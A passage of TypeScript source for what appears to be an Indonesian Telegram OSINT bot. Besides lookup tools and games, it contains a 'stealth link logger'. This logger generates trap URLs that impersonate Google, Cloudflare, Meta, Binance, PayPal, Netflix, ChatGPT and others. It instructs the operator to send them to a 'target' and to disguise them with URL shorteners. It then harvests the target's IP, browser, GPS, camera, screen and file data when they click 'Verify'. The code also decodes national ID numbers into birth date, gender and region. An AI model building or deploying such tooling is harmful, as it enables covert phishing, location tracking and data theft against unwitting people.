        `  └ <i>ᴄᴀʀᴅ ɪꜱꜱᴜᴇʀ & ᴛɪᴇʀ ᴀɴᴀʟʏᴛɪᴄꜱ</i>\n\n` +
        `• <b>/subdomain [ᴅᴏᴍᴀɪɴ]</b>\n` +
        `  └ <i>ɪɴꜰʀᴀꜱᴛʀᴜᴄᴛᴜʀᴇ ꜱᴜʙᴅᴏᴍᴀɪɴ ʀᴇᴄᴏɴ</i>\n\n` +
        `• <b>/github_user [ᴜꜱᴇʀ]</b>\n` +
        `  └ <i>ɢɪᴛʜᴜʙ ᴘʀᴏꜰɪʟᴇ ᴍᴇᴛᴀᴅᴀᴛᴀ</i>\n\n` +
        `• <b>/port [ɪᴘ] [ᴘᴏʀᴛ]</b>\n` +
        `  └ <i>ɴᴇᴛᴡᴏʀᴋ ᴘᴏʀᴛ ꜱᴄᴀɴɴᴇʀ</i>\n\n` +
        `• <b>/phone_dork [ɴᴏᴍᴏʀ]</b>\n` +
        `  └ <i>ᴍᴏʙɪʟᴇ ᴀꜱꜱᴇᴛ ᴏꜱɪɴᴛ ᴛʀᴀᴄᴋᴇʀ</i>\n\n` +
        `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_tools', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🛠️ ᴀᴅᴠᴀɴᴄᴇᴅ ᴜᴛɪʟɪᴛɪᴇꜱ</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n\n` +
        `• <b>/qr [ᴛᴇᴋꜱ]</b>\n` +
        `  └ <i>ɢᴇɴᴇʀᴀᴛᴇ ǫʀ ᴄᴏᴅᴇ</i>\n\n` +
        `• <b>/shortlink [ᴜʀʟ]</b>\n` +
        `  └ <i>ᴘᴇʀꜱɪɴɢᴋᴀᴛ ᴜʀʟ (ɪꜱ.ɢᴅ)</i>\n\n` +
        `• <b>/pwd [ᴘᴀɴᴊᴀɴɢ]</b>\n` +
        `  └ <i>ʙᴜᴀᴛ ᴘᴀꜱꜱᴡᴏʀᴅ ᴇɴᴛʀᴏᴘʏ ᴛɪɴɢɢɪ</i>\n\n` +
        `• <b>/b64enc | /b64dec</b>\n` +
        `  └ <i>ᴋᴏɴᴠᴇʀꜱɪ ᴛᴇᴋꜱ ʙᴀꜱᴇ64</i>\n\n` +
        `• <b>/hash [ᴛᴇᴋꜱ]</b>\n` +
        `  └ <i>ᴄʜᴇᴄᴋꜱᴜᴍ ᴍᴅ5 & ꜱʜᴀ256</i>\n\n` +
        `• <b>/uuid</b>\n` +
        `  └ <i>ɢᴇɴᴇʀᴀᴛᴇ ᴜɴɪǫᴜᴇ ɪᴅ ᴠ4</i>\n\n` +
        `• <b>/weather [ᴋᴏᴛᴀ]</b>\n` +
        `  └ <i>ᴅᴀᴛᴀ ᴄᴜᴀᴄᴀ ʀᴇᴀʟ-ᴛɪᴍᴇ</i>\n\n` +
        `• <b>/crypto_price [ᴋᴏɪɴ]</b>\n` +
        `  └ <i>ᴄᴇᴋ ʜᴀʀɢᴀ ᴀꜱᴇᴛ ᴋʀɪᴘᴛᴏ</i>\n\n` +
        `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_games', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🎲 ᴍɪɴɪ ɢᴀᴍᴇꜱ ᴄᴏɴꜱᴏʟᴇ</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n\n` +
        `• <b>/suit [ʙᴀᴛᴜ/ɢᴜɴᴛɪɴɢ/ᴋᴇʀᴛᴀꜱ]</b>\n\n` +
        `• <b>/math</b> (ᴛᴇʙᴀᴋ ʜᴀꜱɪʟ ᴍᴀᴛᴇᴍᴀᴛɪᴋᴀ)\n\n` +
        `• <b>/dadu</b> (ᴋᴏᴄᴏᴋ ᴅᴀᴅᴜ ꜱᴛᴀɴᴅᴀʀ)\n\n` +
        `• <b>/coinflip</b> (ʟᴇᴍᴘᴀʀ ᴋᴏɪɴ ʜᴇᴀᴅ/ᴛᴀɪʟ)\n\n` +
        `• <b>/susunkata</b> (ᴍᴀɪɴ ᴀᴄᴀᴋ ᴋᴀᴛᴀ)\n\n` +
        `• <b>/tebakangka</b> (1-10)\n\n` +
        `• <b>/khodam [ɴᴀᴍᴀ]</b> (ᴄᴇᴋ ᴋʜᴏᴅᴀᴍ)\n\n` +
        `• <b>/ramal [ɴᴀᴍᴀ]</b> (ʀᴀᴍᴀʟᴀɴ ᴀɪ)\n\n` +
        `• <b>/jodoh [ɴᴀᴍᴀ1] [ɴᴀᴍᴀ2]</b> (ᴋᴀʟᴋᴜʟᴀᴛᴏʀ ᴊᴏᴅᴏʜ)\n\n` +
        `• <b>/kartu</b> (ᴀᴍʙɪʟ ᴋᴀʀᴛᴜ ʀᴇᴍɪ)\n\n` +
        `• <b>/roulette</b> (ʀᴜꜱꜱɪᴀɴ ʀᴏᴜʟᴇᴛᴛᴇ)\n\n` +
        `• <b>/8ball [ᴛᴇᴋꜱ]</b> (ᴍᴀɢɪᴄ 8-ʙᴀʟʟ)\n\n` +
        `• <b>/tarot</b> (ʀᴀᴍᴀʟᴀɴ ᴋᴀʀᴛᴜ ᴛᴀʀᴏᴛ)\n\n` +
        `• <b>/doa</b> (ᴅᴏᴀ & ᴍᴏᴛɪᴠᴀꜱɪ ʀᴀɴᴅᴏᴍ)\n\n` +
        `• <b>/tod</b> (ᴛʀᴜᴛʜ ᴏʀ ᴅᴀʀᴇ)\n\n` +
        `• <b>/meme</b> | <b>/joke</b> | <b>/quote</b>\n\n` +
        `• <b>/fact</b> (ꜰᴀᴋᴛᴀ ᴜɴɪᴋ ɢʟᴏʙᴀʟ)\n\n` +
        `• <b>/cat</b> | <b>/dog</b>\n\n` +
        `• <b>/gombal [ɴᴀᴍᴀ]</b> (ɢᴏᴍʙᴀʟᴀɴ ᴍᴀᴜᴛ)\n\n` +
        `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_media', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🎵 ᴍᴇᴅɪᴀ & ᴅᴏᴡɴʟᴏᴀᴅꜱ</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n\n` +
        `• <b>/lagu [ᴊᴜᴅᴜʟ]</b>\n` +
        `  └ <i>ᴀᴜᴅɪᴏ ᴅᴏᴡɴʟᴏᴀᴅ ᴇɴɢɪɴᴇ (ᴍᴘ3)</i>\n\n` +
        `• <b>/play [ᴊᴜᴅᴜʟ]</b>\n` +
        `  └ <i>ꜱᴀᴍᴀ ᴅᴇɴɢᴀɴ /ʟᴀɢᴜ</i>\n\n` +
        `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_logger', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const id = generateTrapId(ctx.chat!.id);
      let msg = `<b>🎣 ꜱᴛᴇᴀʟᴛʜ ʟɪɴᴋ ʟᴏɢɢᴇʀ ᴠ5.2</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `ᴘɪʟɪʜ ᴛᴇᴍᴘʟᴀᴛᴇ ᴏᴘᴇʀᴀꜱɪᴏɴᴀʟ ʙᴇʀɪᴋᴜᴛ:\n\n`;
      
      const tmplDesc: Record<string, string> = {
        'google': '└ <i>ɪᴅᴇɴᴛɪᴛʏ ᴇᴄᴏꜱʏꜱᴛᴇᴍ. ᴀᴜᴅɪᴛ ʙʀᴏᴡꜱᴇʀ-ʙᴜꜱ & ʜɪɢʜ-ᴇɴᴛʀᴏᴘʏ.</i>',
        'gallery': '└ <i>ꜰᴏʀᴇɴꜱɪᴄ ʀᴇɢɪꜱᴛʀʏ. ᴍᴇᴅɪᴀ ᴛᴇʟᴇᴍᴇᴛʀʏ & ꜱᴏᴄɪᴀʟ-ɢʀᴀᴘʜ.</i>',
        'cloudflare': '└ <i>ᴇᴅɢᴇ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ. ᴘʀᴇᴄɪꜱɪᴏɴ ꜰɪɴɢᴇʀᴘʀɪɴᴛɪɴɢ.</i>',
        'pegasus': '└ <i>ᴋᴇʀɴᴇʟ ɪɴᴛᴇʟʟɪɢᴇɴᴄᴇ ᴠ9.3. ᴇʟɪᴛᴇ ʜᴀʀᴅᴡᴀʀᴇ (ꜱᴛᴀʙʟᴇ).</i>',
        'wifi': '└ <i>ʜᴏᴛꜱᴘᴏᴛ ᴀᴜᴛʜ. ɴᴇᴛᴡᴏʀᴋ ꜰᴏʀᴇɴꜱɪᴄ ᴍᴀᴘᴘɪɴɢ.</i>',
        'recap': '└ <i>ɢʜᴏꜱᴛ ʀᴇᴄᴏɴ. ᴍᴜʟᴛɪ-ʟᴀʏᴇʀᴇᴅ ꜱɪʟᴇɴᴛ ᴛᴇʟᴇᴍᴇᴛʀʏ.</i>',
        'security_audit': '└ <i>ꜱʏꜱᴛᴇᴍ ᴀᴜᴅɪᴛ. ᴇɴᴠɪʀᴏɴᴍᴇɴᴛ ɪɴᴛᴇɢʀɪᴛʏ ᴄʜᴇᴄᴋ.</i>',
        'meta_login': '└ <i>ꜱᴏᴄɪᴀʟ ꜱʏɴᴄ. ʀᴇᴄᴏᴠᴇʀ ᴀᴄᴄᴏᴜɴᴛ ᴠɪᴀ ʜᴀʀᴅᴡᴀʀᴇ.</i>',
        'binance': '└ <i>ᴄʀʏᴘᴛᴏ ꜱᴇᴄᴜʀɪᴛʏ. ʜᴀʀᴅᴡᴀʀᴇ ᴀᴜᴅɪᴛ ꜰᴏʀ ᴀꜱꜱᴇᴛꜱ.</i>',
        'paypal': '└ <i>ꜰɪɴᴛᴇᴄʜ ᴀᴜᴅɪᴛ. ᴛʀᴀɴꜱᴀᴄᴛɪᴏɴ ꜱᴀꜰᴇᴛʏ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ.</i>',
        'steam': '└ <i>ɢᴀᴍɪɴɢ ɢᴜᴀʀᴅ. ᴀᴄᴄᴏᴜɴᴛ ʀᴇᴄᴏᴠᴇʀʏ ꜱʏɴᴄ.</i>',
        'netflix': '└ <i>ᴍᴇᴅɪᴀ ꜱʏɴᴄ. ʜᴏᴜꜱᴇʜᴏʟᴅ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ɢʀɪᴅ.</i>',
        'tiktok': '└ <i>ᴄʀᴇᴀᴛᴏʀ ᴀᴜᴅɪᴛ. ᴇɴᴠɪʀᴏɴᴍᴇɴᴛ ɪɴᴛᴇɢʀɪᴛʏ ᴄʜᴇᴄᴋ.</i>',
        'chatgpt': '└ <i>ᴀɪ ᴅᴇᴠ ᴀᴜᴅɪᴛ. ᴀᴘɪ ǫᴜᴏᴛᴀ & ᴅᴇᴠ ᴇɴᴠ ᴍᴀᴘᴘɪɴɢ.</i>'
      };

      Object.entries(templates).forEach(([key, tmpl]) => {
        const trapUrl = `${appHost.replace(/\/$/, '')}/t/${key}/${id}`;
        msg += `📦 <b>${tmpl.name}</b>\n` +
               `${tmplDesc[key] || ''}\n` +
               `🔗 <code>${trapUrl}</code>\n\n` +
               `━━━━━━━━━━━━━━━━━━━━\n\n`;
      });

      msg += `💡 <b>ɪɴꜰᴏ:</b> ʙʀᴏᴡꜱᴇʀ & ɪᴘ ᴅɪᴅᴇᴛᴇᴋꜱɪ ᴏᴛᴏᴍᴀᴛɪꜱ.\n` +
             `ᴍᴏᴅᴜʟᴇ <b>ᴀᴅᴠᴀɴᴄᴇᴅ</b> (ɢᴘꜱ, ᴄᴀᴍ, ꜰɪʟᴇꜱ) ᴛᴇʀᴋɪʀɪᴍ ᴊɪᴋᴀ ᴛᴀʀɢᴇᴛ ᴍᴇɴɢɪᴢɪɴᴋᴀɴ ᴀᴋꜱᴇꜱ.\n\n` +
             `⚠️ <i>ꜱᴀʀᴀɴ: ɢᴜɴᴀᴋᴀɴ ʟᴀʏᴀɴᴀɴ ᴘᴇᴍᴇɴᴅᴇᴋ ᴜʀʟ.</i>`;
      
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(msg, {
        parse_mode: 'HTML',
        link_preview_options: { is_disabled: true },
        ...kb
      }).catch(() => {});
    });

    bot.action('menu_help', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>ℹ️ ᴛᴇʀᴍɪɴᴀʟ ɪɴꜰᴏ & ʜᴇʟᴘ</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n\n` +
        `ᴅɪʙᴜᴀᴛ ᴜɴᴛᴜᴋ ᴛᴜᴊᴜᴀɴ ᴇᴅᴜᴋᴀꜱɪ ɪɴᴠᴇꜱᴛɪɢᴀꜱɪ ᴅɪɢɪᴛᴀʟ (ᴏꜱɪɴᴛ).\n\n` +
        `━━━━━━━━━━━━━━━━━━━━\n\n` +
        `🌐 <b>ʜᴏꜱᴛ ᴀᴋᴛɪꜰ</b>\n` +
        `<code>${appHost}</code>\n\n` +
        `✅ <b>ꜱᴛᴀᴛᴜꜱ ʙᴏᴛ</b>\n` +
        `ᴏɴʟɪɴᴇ\n\n` +
        `⚙️ <b>ᴘᴇʀɪɴᴛᴀʜ</b>\n` +
        `ɢᴜɴᴀᴋᴀɴ <code>/ꜱᴇᴛʜᴏꜱᴛ</code> ᴊɪᴋᴀ ʟɪɴᴋ ʟᴏɢɢᴇʀ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴅɪʙᴜᴋᴀ.\n\n` +
        `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.command('nik', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /nik 3201010101900001");
      const nik = args[1];

      if (!/^\d{16}$/.test(nik)) {
        return ctx.reply("❌ NIK harus terdiri dari 16 digit angka.");
      }

      const provMap: Record<string, string> = { "11": "Aceh", "12": "Sumatera Utara", "13": "Sumatera Barat", "14": "Riau", "15": "Jambi", "16": "Sumatera Selatan", "17": "Bengkulu", "18": "Lampung", "19": "Kepulauan Bangka Belitung", "21": "Kepulauan Riau", "31": "DKI Jakarta", "32": "Jawa Barat", "33": "Jawa Tengah", "34": "DI Yogyakarta", "35": "Jawa Timur", "36": "Banten", "51": "Bali", "52": "Nusa Tenggara Barat", "53": "Nusa Tenggara Timur", "61": "Kalimantan Barat", "62": "Kalimantan Tengah", "63": "Kalimantan Selatan", "64": "Kalimantan Timur", "65": "Kalimantan Utara", "71": "Sulawesi Utara", "72": "Sulawesi Tengah", "73": "Sulawesi Selatan", "74": "Sulawesi Tenggara", "75": "Gorontalo", "76": "Sulawesi Barat", "81": "Maluku", "82": "Maluku Utara", "91": "Papua Barat", "94": "Papua" };

      const prov = nik.substring(0, 2);
      const kab = nik.substring(2, 4);
      const kec = nik.substring(4, 6);
      let tgl = parseInt(nik.substring(6, 8), 10);
      const bln = nik.substring(8, 10);
      let thn = parseInt(nik.substring(10, 12), 10);
      const urut = nik.substring(12, 16);

      let jk = "Laki-laki 👨";
      if (tgl >= 40) {
        jk = "Perempuan 👩";
        tgl -= 40;
      }
      
      const currentYear = new Date().getFullYear() % 100;
      thn = thn > currentYear ? 1900 + thn : 2000 + thn;

      const provinsi = provMap[prov] || "Tidak diketahui";

      const reply = `<b>🇮🇩 DATA NIK DECODER</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `📋 <b>NIK:</b> <code>${nik}</code>\n` +
                    `👤 <b>Gender:</b> ${jk}\n` +
                    `📅 <b>Lahir:</b> <code>${tgl.toString().padStart(2, '0')}-${bln}-${thn}</code>\n` +
                    `📍 <b>Wilayah:</b>\n` +
                    `├ Provinsi: ${provinsi}\n` +
                    `├ Kode Kab: ${kab}\n` +
                    `└ Kode Kec: ${kec}\n` +
                    `🔢 <b>No Urut:</b> ${urut}\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>Analisis selesai.</i>`;

      ctx.reply(reply, { parse_mode: 'HTML' });
    });

    bot.command('plat', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /plat B 1234 ABC atau /plat B1234ABC");
      
      const platInput = args.slice(1).join('').toUpperCase();
      const match = platInput.match(/^([A-Z]{1,2})(\d{1,4})([A-Z]{0,3})$/);
      
      if (!match) return ctx.reply("❌ Format plat nomor tidak valid.");
      
      const platMap: Record<string, string> = { "A": "Banten", "B": "DKI Jakarta, Depok, Tangerang, Bekasi", "D": "Bandung, Cimahi", "E": "Cirebon, Indramayu, Majalengka, Kuningan", "F": "Bogor, Sukabumi, Cianjur", "T": "Purwakarta, Karawang, Subang", "Z": "Garut, Tasikmalaya, Sumedang, Ciamis, Banjar", "G": "Pekalongan, Tegal, Brebes, Batang, Pemalang", "H": "Semarang", "DN": "Sulawesi Tengah", "DT": "Sulawesi Tenggara", "DD": "Makassar, Gowa, Maros", "DP": "Parepare, Palopo, Luwu", "DC": "Sulawesi Barat", "PA": "Papua", "PB": "Papua Barat", "BL": "Aceh", "BB": "Sumut (Barat)", "BK": "Sumut (Timur)/Medan", "BA": "Sumatera Barat", "BM": "Riau", "BP": "Kepulauan Riau", "BG": "Sumatera Selatan", "BN": "Bangka Belitung", "BE": "Lampung", "BD": "Bengkulu", "BH": "Jambi" };

      const kodeWilayah = match[1];
      const angka = match[2];
      const kodeDetail = match[3];

      const wilayah = platMap[kodeWilayah] || "Wilayah tidak terdaftar";

      const reply = `━━━━━ ᴘʟᴀᴛ ᴀɴᴀʟʏᴢᴇʀ ━━━━━\n\n` +
                    `🔢 <b>ᴘʟᴀᴛ :</b> <code>${kodeWilayah} ${angka} ${kodeDetail}</code>\n\n` +
                    `📍 <b>ᴡɪʟᴀʏᴀʜ :</b> ${wilayah}\n\n` +
                    `├ ᴋᴏᴅᴇ ᴀʀᴇᴀ : ${kodeWilayah}\n` +
                    `├ ɴᴏ ᴘᴏʟɪꜱɪ : ${angka}\n` +
                    `└ ᴅᴇᴛᴀɪʟ/ꜱᴜʙ : ${kodeDetail || '-'}\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>ᴀɴᴀʟɪꜱɪꜱ ꜱᴇʟᴇꜱᴀɪ.</i>`;

      ctx.reply(reply, { parse_mode: 'HTML' });
    });

    bot.command('sethost', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length > 1) {
        let newHost = args[1];
        if (!newHost.startsWith('http')) newHost = 'https://' + newHost;
        appHost = newHost;
        ctx.reply(`✅ <b>System Host diubah manual ke:</b>\n<code>${appHost}</code>\n\nCoba jalankan /logger kembali.`, {parse_mode: 'HTML'});
      } else {
        ctx.reply(`ℹ️ <b>Host saat ini:</b>\n<code>${appHost}</code>\n\nJika link IP Logger error (problem loading page/localhost/404), gunakan perintah:\n<code>/sethost https://URL_WEB_ANDA</code>\nAtau pastikan web app Anda sedang online.`, {parse_mode: 'HTML'});
      }
    });

    bot.command('logger', (ctx) => {
      const id = generateTrapId(ctx.chat.id);
      
      let replyMessage = `🎣 <b>STEALTH LINK GENERATED</b>\n` +
                         `━━━━━━━━━━━━━━━━━━━━\n` +
                         `Silakan pilih template link yang sesuai dengan target Anda:\n\n`;
      
      Object.entries(templates).forEach(([key, tmpl]) => {
        const trapUrl = `${appHost.replace(/\/$/, '')}/t/${key}/${id}`;
        replyMessage += `<b>${tmpl.name}</b>\n🔗 <code>${trapUrl}</code>\n\n`;
      });
      
      replyMessage += `━━━━━━━━━━━━━━━━━━━━\n` +
                      `💡 <b>CARA KERJA:</b>\n` +
                      `1. Kirim link di atas ke target.\n` +
                      `2. Saat diklik, IP & Browser akan terdeteksi.\n` +
                      `3. Jika target klik button "Verify", data <b>Advanced Module</b> (GPS, Cam-ID, Screen, Files) akan terkirim.\n\n` +
                      `⚠️ <i>Tips: Gunakan shortener (bit.ly/tinyurl) agar link terlihat lebih profesional.</i>`;
      
      ctx.reply(replyMessage, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('ip', async (ctx) => {
      const args = ctx.message.text.split(' ');
      const ip = args.length > 1 ? args[1] : '';
      let url = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,reverse,mobile,proxy,hosting,query`;
      
      try {
        const response = await fetch(url);
        const data = await response.json();
        if (data.status === 'success') {
          const mapLink = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
          let reply = `<b>🌐 TARGET IP ANALYTICS</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `💎 <b>QUERY:</b> <code>${data.query}</code>\n\n` +
                      `🏢 <b>INFRASTRUKTUR:</b>\n` +
                      `├ ISP: ${data.isp || '-'}\n` +
                      `├ ORG: ${data.org || '-'}\n` +
                      `├ ASN: ${data.as || '-'}\n` +
                      `└ RVRS: ${data.reverse || '-'}\n\n` +
                      `📍 <b>LOKASI REGIONAL:</b>\n` +
                      `├ NEGARA: ${data.country || '-'}\n` +
                      `├ REGION: ${data.regionName || '-'}\n` +
                      `├ KOTA: ${data.city || '-'}\n` +
                      `├ POS: ${data.zip || '-'}\n` +
                      `└ TMZN: ${data.timezone || '-'}\n\n` +
                      `🌎 <b>SPATIAL:</b>\n` +
                      `├ COORD: <code>${data.lat || '-'}, ${data.lon || '-'}</code>\n` +
                      `└ MAPS: <a href="${mapLink}">Lihat Lokasi BTS</a>\n\n` +
                      `🛡️ <b>RISK ANALYSIS:</b>\n` +
                      `├ MOBILE: ${data.mobile ? '✅' : '❌'}\n` +
                      `├ PROXY/VPN: ${data.proxy ? '⚠️ DETEKSI' : '✅ BERSIH'}\n` +
                      `└ HOSTING: ${data.hosting ? '⚠️ SERVER' : '✅ RESIDENTIAL'}\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `⚠️ <i>Info: Geolocation IP mengacu pada titik registrasi provider, bukan titik GPS fisik target. Gunakan /logger untuk hasil presisi.</i>`;
          ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
        } else {
          ctx.reply("❌ Gagal mendapatkan informasi IP.");
        }
      } catch (e) {
        ctx.reply("❌ Terjadi kesalahan sistem saat mengecek IP.");
      }
    });

    bot.command('whois', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /whois google.com");
      const domain = args[1].replace(/https?:\/\//, '').replace(/\/$/, '');
      
      try {
        ctx.reply(`🔍 Sedang menganalisis detail registrar WHOIS untuk <b>${domain}</b>...`, { parse_mode: 'HTML' });
        const res = await fetch(`https://networkcalc.com/api/dns/whois/${domain}`);
        const data = await res.json();
        if (data.status === 'OK' && data.whois) {
          let txt = `🌐 <b>WHOIS DATA ANALYTICS</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>DOMAIN:</b> <code>${domain}</code>\n\n` +
                    `📝 <b>REGISTRAR INFO:</b>\n` +
                    `└ Name: ${data.whois.registrar || '-'}\n\n` +
                    `📆 <b>DATES:</b>\n` +
                    `├ CREATED: ${data.whois.creation_date || '-'}\n` +
                    `├ UPDATED: ${data.whois.updated_date || '-'}\n` +
                    `└ EXPIRED: ${data.whois.expiration_date || '-'}\n\n` +
                    `📡 <b>NAME SERVERS:</b>\n` +
                    (data.whois.name_servers || []).map((ns:any)=>`├ <code>${ns}</code>`).join('\n').replace(/├$/, '└') +
                    `\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>Query WHOIS berhasil.</i>`;
          ctx.reply(txt, {parse_mode: 'HTML'});
        } else {
          ctx.reply(`❌ Whois data tidak ditemukan untuk <code>${domain}</code>. (Pastikan format domain benar tanpa https://)`, {parse_mode: 'HTML'});
        }
      } catch (e) {
        ctx.reply("❌ Terjadi kesalahan sistem saat mengecek Whois.");
      }
    });

    bot.command('dns', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /dns google.com");
      const domain = args[1].replace(/https?:\/\//, '').replace(/\/$/, '');
      
      try {
        ctx.reply(`📡 Menarik data DNS Records & Routing IP untuk <b>${domain}</b>...`, { parse_mode: 'HTML' });
        const response = await fetch(`https://networkcalc.com/api/dns/lookup/${domain}`);
        const data = await response.json();
        if(data.status === 'OK' && data.records) {
          let txt = `━━━━━ ᴅɴꜱ ᴍᴀᴘᴘɪɴɢ ━━━━━\n\n` +
                    `💎 <b>ᴅᴏᴍᴀɪɴ :</b> <code>${domain}</code>\n\n`;
          ['A', 'AAAA', 'MX', 'TXT', 'CNAME', 'NS'].forEach(type => {
            if(data.records[type] && data.records[type].length > 0) {
              txt += `<b>[+] ${type} ʀᴇᴄᴏʀᴅꜱ :</b>\n`;
              data.records[type].forEach((rec: any, idx: number, arr: any[]) => {
                const sym = idx === arr.length - 1 ? '└' : '├';
                if(type === 'MX') txt += `${sym} <code>${rec.exchange}</code> (ᴘʀɪᴏ: ${rec.priority})\n`;
                else if(type === 'TXT') txt += `${sym} <code>${rec.replace(/.{1,40}/g, '$&')}</code>\n`;
                else txt += `${sym} <code>${rec.address || rec}</code>\n`;
              });
              txt += '\n';
            }
          });
          txt += `━━━━━━━━━━━━━━━━━━━━\n` +
                 `✅ <i>ꜰᴇᴛᴄʜ ᴅɴꜱ ꜱᴇʟᴇꜱᴀɪ.</i>`;
          if(txt.length > 4000) txt = txt.substring(0, 3950) + "\n\n... (Terpotong limit)";
          ctx.reply(txt, {parse_mode: 'HTML'});
        } else {
          ctx.reply("❌ DNS records tidak ditemukan.");
        }
      } catch (e) {
        ctx.reply("❌ Terjadi kesalahan sistem saat mengecek DNS.");
      }
    });

    bot.command('domain', (ctx) => ctx.reply("Gunakan /whois [domain] atau /dns [domain]"));

    bot.command('email', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2 || !args[1].includes('@')) return ctx.reply("Format salah. Contoh: /email target@example.com");
      const email = args[1];
      
      try {
        const domain = email.split("@")[1];
        const records = await resolveMx(domain);
        if (records && records.length > 0) {
          const reply = `<b>📧 EMAIL MX VALIDATOR</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `🎯 <b>TARGET:</b> <code>${email}</code>\n` +
                        `🌐 <b>DOMAIN:</b> <code>${domain}</code>\n\n` +
                        `✅ STATUS:<b> AKTIF Menerima Email</b>\n\n` +
                        `📋 <b>MX RECORDS:</b>\n` +
                        records.map((r, idx) => `${idx === records.length - 1 ? '└' : '├'} [Pri: ${r.priority}] ${r.exchange}`).join('\n') +
                        `\n━━━━━━━━━━━━━━━━━━━━`;
          ctx.reply(reply, { parse_mode: 'HTML' });
        } else {
          ctx.reply(`❌ Tidak ditemukan MX records untuk domain ${domain}.`);
        }
      } catch (e) {
        ctx.reply(`❌ Format valid, tapi kami tidak bisa memverifikasi MX records (domain mungkin tidak aktif atau memblokir pengecekan).`);
      }
    });

    bot.command('username', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("❌ <b>Format salah.</b>\nContoh: <code>/username targetnya</code>", { parse_mode: 'HTML' });
      
      const rawInput = args.slice(1).join('').toLowerCase();
      const username = rawInput.replace(/[^a-z0-9_.-]/g, '');
      if (!username) return ctx.reply("❌ <b>Username tidak valid.</b>", { parse_mode: 'HTML' });
      
      ctx.reply(`🔍 Memindai jejak digital untuk <b>@${username}</b>...\n<i>Mengecek puluhan platform...</i>`, { parse_mode: 'HTML' });
      
      const platforms = [
        // Global Social Media & Tech (~80 Platforms)
        { name: "GitHub", url: `https://github.com/${username}` },
        { name: "Twitter", url: `https://twitter.com/${username}` },
        { name: "Instagram", url: `https://www.instagram.com/${username}/` },
        { name: "TikTok", url: `https://www.tiktok.com/@${username}` },
        { name: "YouTube", url: `https://www.youtube.com/@${username}` },
        { name: "Facebook", url: `https://www.facebook.com/${username}` },
        { name: "Pinterest", url: `https://www.pinterest.com/${username}` },
        { name: "Reddit", url: `https://www.reddit.com/user/${username}` },
        { name: "Tumblr", url: `https://${username}.tumblr.com` },
        { name: "Medium", url: `https://medium.com/@${username}` },
        { name: "Vimeo", url: `https://vimeo.com/${username}` },
        { name: "SoundCloud", url: `https://soundcloud.com/${username}` },
        { name: "Spotify", url: `https://open.spotify.com/user/${username}` },
        { name: "Twitch", url: `https://www.twitch.tv/${username}` },
        { name: "Steam", url: `https://steamcommunity.com/id/${username}` },
        { name: "Flickr", url: `https://www.flickr.com/people/${username}` },
        { name: "Patreon", url: `https://www.patreon.com/${username}` },
        { name: "Dev.to", url: `https://dev.to/${username}` },
        { name: "Wattpad", url: `https://www.wattpad.com/user/${username}` },
        { name: "VK", url: `https://vk.com/${username}` },
